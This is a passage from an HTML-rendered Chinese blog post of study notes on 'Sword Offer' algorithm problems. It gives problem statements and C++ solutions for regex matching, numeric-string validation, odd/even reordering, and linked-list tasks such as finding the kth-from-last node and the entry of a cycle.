</span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);  <span class="comment">// 凡是可能删除head的情况, 都应加个不会被删除的dummy节点</span></span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        <span class="keyword">auto</span> p = dummy;  <span class="comment">// p指向上一个长度为1的段的为指针</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">auto</span> q = p-&gt;next;</span><br><span class="line">            <span class="keyword">while</span> (q &amp;&amp; p-&gt;next-&gt;val == q-&gt;val) q = q-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next-&gt;next == q) p = p-&gt;next;</span><br><span class="line">            <span class="keyword">else</span> p-&gt;next = q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="正则表达式匹配★"><a href="https://www.acwing.com/problem/content/28/">正则表达式匹配★</a></h2><p>请实现一个函数用来匹配包括<code>'.'</code>和<code>'*'</code>的正则表达式。</p><p>模式中的字符<code>'.'</code>表示任意一个字符，而<code>'*'</code>表示它前面的字符可以出现任意次（含0次）。</p><p>在本题中，匹配是指字符串的所有字符匹配整个模式。</p><p>例如，字符串<code>&quot;aaa&quot;</code>与模式<code>&quot;a.a&quot;</code>和<code>&quot;ab*ac*a&quot;</code>匹配，但是与<code>&quot;aa.a&quot;</code>和<code>&quot;ab*a&quot;</code>均不匹配。</p><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>300</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,300]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">300</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：s=&quot;aa&quot;p=&quot;a*&quot;输出:true</code></pre><h3 id="DP大法好-O-nm">DP大法好 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span></h3><p><strong>状态表示</strong> <code>f[i][j]</code>表示<code>s[i,...]</code>与<code>p[j,...]</code>是否相匹配</p><p><strong>状态计算</strong></p><ol><li><p>p[j]是正常字符, <code>f[i][j] = (s[i] == p[j] &amp;&amp; f[i+1][j+1])</code></p></li><li><p>p[j] = ‘.’, <code>f[i][j] = f[i+1][j+1]</code></p></li><li><p>p[j+1] = ‘*’, <code>f[i][j] = f[i][j+2] || (s[i] == p[j] &amp;&amp; f[i+1][j])</code></p><p><code>f[i][j+2]</code>对应 '*'表示0个p[j]<br><code>s[i]==p[j] &amp;&amp; f[i+1][j]</code> 对应 非0任意多个p[j]</p></li></ol><p><strong>边界情况</strong> <code>f[n][m] = true</code></p><p><strong>时间复杂度分析</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 表示s的长度，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 表示p的长度，总共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">nm</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">nm</span></span></span></span> 个状态，状态转移复杂度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，所以总时间复杂度是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  string s, p;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; f;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string _s, string _p)</span> </span>&#123;</span><br><span class="line">    s = _s, p = _p;</span><br><span class="line">    n = s.<span class="built_in">size</span>(), m = p.<span class="built_in">size</span>();</span><br><span class="line">    <span class="comment">// vector&lt;vector&lt;int&gt;&gt; f(n + 1, vector&lt;int&gt;(m + 1, -1));  // 错误写法</span></span><br><span class="line">    f = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">-1</span>));  <span class="comment">// n + 1, 而非n</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dp</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (f[x][y] != <span class="number">-1</span>) <span class="keyword">return</span> f[x][y];</span><br><span class="line">    <span class="keyword">if</span> (y == m) &#123;  <span class="comment">// x对应n, y对应m</span></span><br><span class="line">      <span class="keyword">return</span> f[x][y] = x == n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> first_match = x &lt; n &amp;&amp; (p[y] == <span class="string">&#x27;.&#x27;</span> || s[x] == p[y]);</span><br><span class="line">    <span class="keyword">if</span> (y + <span class="number">1</span> &lt; m &amp;&amp; p[y + <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">      f[x][y] = <span class="built_in">dp</span>(x, y + <span class="number">2</span>) || (first_match &amp;&amp; <span class="built_in">dp</span>(x + <span class="number">1</span>, y));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      f[x][y] = first_match &amp;&amp; <span class="built_in">dp</span>(x + <span class="number">1</span>, y + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[x][y];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="表示数值的字符串🤯"><a href="https://www.acwing.com/problem/content/29/">表示数值的字符串🤯</a></h2><p>请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。</p><p>例如，字符串<code>&quot;+100&quot;</code>,<code>&quot;5e2&quot;</code>,<code>&quot;-123&quot;</code>,<code>&quot;3.1416&quot;</code>和<code>&quot;-1E-16&quot;</code>都表示数值。</p><p>但是<code>&quot;12e&quot;</code>,<code>&quot;1a3.14&quot;</code>,<code>&quot;1.2.3&quot;</code>,<code>&quot;+-5&quot;</code>和<code>&quot;12e+4.3&quot;</code>都不是。</p><p><strong>注意</strong>:</p><ol><li>小数可以没有整数部分，例如.123等于0.123；</li><li>小数点后面可以没有数字，例如233.等于233.0；</li><li>小数点前面和后面可以有数字，例如233.666;</li><li>当e或E前面没有数字时，整个字符串不能表示数字，例如.e1、e1；</li><li>当e或E后面没有整数时，整个字符串不能表示数字，例如12e、12e+5.4;</li></ol><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>25</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,25]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">25</span><span class="mclose">]</span></span></span></span>。<br>字符串中不含空格。</p><p><strong>样例：</strong></p><pre><code>输入: &quot;0&quot;输出: true</code></pre><h3 id="模拟法-O-n">模拟法 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>难顶的模拟题</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isNumber</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.去除开头和结尾的空格</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = s.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; s[i] == <span class="string">&#x27; &#x27;</span>) i++;</span><br><span class="line">    <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; s[j] == <span class="string">&#x27; &#x27;</span>) j--;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; j) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s = s.<span class="built_in">substr</span>(i, j - i + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.去除开头的 + 和 - (去除后在循环中只用判断数字、点、e/E 3种情况)</span></span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">&#x27;+&#x27;</span> || s[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) s = s.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">size</span>() == <span class="number">1</span> &amp;&amp; s[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> dot = <span class="number">0</span>, e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;  <span class="comment">// 字符, 而非数字</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        dot++;</span><br><span class="line">        <span class="keyword">if</span> (dot &gt; <span class="number">1</span> || e) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;e&#x27;</span> || s[i] == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">        e++;</span><br><span class="line">        <span class="keyword">if</span> (!i || i == s.<span class="built_in">size</span>() - <span class="number">1</span> || (i == <span class="number">1</span> &amp;&amp; s[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) || e &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; s.<span class="built_in">size</span>() &amp;&amp; (s[i + <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span> || s[i + <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (i + <span class="number">1</span> == s.<span class="built_in">size</span>() - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">          i++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 中间若包含其他字符，则ret false(&#x27;e&#x27;后接&#x27;+/-&#x27;的情况在&#x27;e&#x27;中处理)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="调整数组顺序使奇数位于偶数前面"><a href="https://www.acwing.com/problem/content/30/">调整数组顺序使奇数位于偶数前面</a></h2><p>输入一个整数数组，实现一个函数来调整该数组中数字的顺序。</p><p>使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,3,4,5]输出: [1,3,5,2,4]</code></pre><h3 id="循环遍历-O-n">循环遍历 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">reOrderArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;array)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = array.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r &amp;&amp; array[l] % <span class="number">2</span> == <span class="number">1</span>) l++;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r &amp;&amp; array[r] % <span class="number">2</span> == <span class="number">0</span>) r--;</span><br><span class="line">      <span class="built_in">swap</span>(array[l], array[r]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="链表中倒数第k个节点"><a href="https://www.acwing.com/problem/content/32/">链表中倒数第k个节点</a></h2><p>输入一个链表，输出该链表中倒数第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个结点。</p><p><strong>注意：</strong></p><ul><li><code>k &gt;= 1</code>;</li><li>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 大于链表长度，则返回 NULL;</li></ul><p><strong>数据范围</strong></p><p>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>30</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,30]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：链表：1-&gt;2-&gt;3-&gt;4-&gt;5 ，k=2输出：4</code></pre><h3 id="法1-1-pass-with-快慢指针-O-n">法1 1-pass with 快慢指针 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">findKthToTail</span><span class="params">(ListNode* pListHead, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode *fast = pListHead, *slow = pListHead;</span><br><span class="line">    <span class="keyword">while</span> (k--) &#123;</span><br><span class="line">      <span class="keyword">if</span> (fast) &#123;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (fast) &#123;</span><br><span class="line">      fast = fast-&gt;next;</span><br><span class="line">      slow = slow-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-2-pass-O-n">法2 2-pass <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">findKthToTail</span><span class="params">(ListNode* pListHead, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p = pListHead; p; p = p-&gt;next) s++;</span><br><span class="line">    <span class="keyword">if</span> (s &lt; k) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">auto</span> p = pListHead;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s - k; i++) p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="链表中环的入口结点★"><a href="https://www.acwing.com/problem/content/86/">链表中环的入口结点★</a></h2><p>给定一个链表，若其中包含环，则输出环的入口节点。</p><p>若其中不包含环，则输出<code>null</code>。</p><p><strong>数据范围</strong></p><p>节点 val 值取值范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。<br>节点 val 值各不相同。<br>链表长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221216152840724.png" alt></p><pre><code>给定如上所示的链表：[1, 2, 3, 4, 5, 6]2注意，这里的2表示编号是2的节点，节点编号从0开始。所以编号是2的节点就是val等于3的节点。则输出环的入口节点3.</code></pre><h3 id="法1-小学奥数-快慢指针扫描-O-n">法1 小学奥数 + 快慢指针扫描 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>解析请看<a href="https://www.acwing.com/video/158/">y总视频</a><br>看懂后以后遇到此题在草稿纸上自己应该能推导出来</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode *<span class="title">entryNodeOfLoop</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 防止只有1个元素的无环情况: 相遇后访问next语句会导致segment fault</span></span><br><span class="line">    <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    </span><br><span class="line">    ListNode *fast = head, *slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast &amp;&amp; slow) &#123;</span><br><span class="line">      fast = fast-&gt;next;</span><br><span class="line">      slow = slow-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (fast) fast = 